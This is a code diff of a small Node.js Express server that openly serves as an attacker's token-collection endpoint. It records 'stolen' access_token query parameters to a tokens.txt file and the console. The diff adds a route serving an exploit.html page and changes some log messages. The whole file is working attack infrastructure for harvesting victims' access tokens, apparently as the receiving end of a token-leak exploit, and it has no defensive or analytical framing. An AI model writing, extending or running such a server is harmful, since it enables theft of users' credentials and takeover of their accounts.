@@ -1,20 +1,25 @@
 const express = require('express');
-const app = express();
 const path = require('path');
 const fs = require('fs');
 
-app.use(express.static(path.join(__dirname, 'public')));
+const app = express();
+const PORT = process.env.PORT || 3000;
 
-// Log stolen tokens
+// Route to serve exploit.html
+app.get('/exploit', (req, res) => {
+    res.sendFile(path.join(__dirname, 'exploit.html'));
+});
+
+// Log stolen token if present
 app.get('/', (req, res) => {
     if (req.query.access_token) {
         const log = `[${new Date().toISOString()}] Token: ${req.query.access_token}\n`;
         fs.appendFileSync('tokens.txt', log);
         console.log(log);
     }
-    res.send('Logged!');
+    res.send('Token received (if present).');
 });
 
-app.listen(process.env.PORT || 3000, () => {
-    console.log('Exploit server running');
+app.listen(PORT, () => {
+    console.log(`Server running on port ${PORT}`);
 });
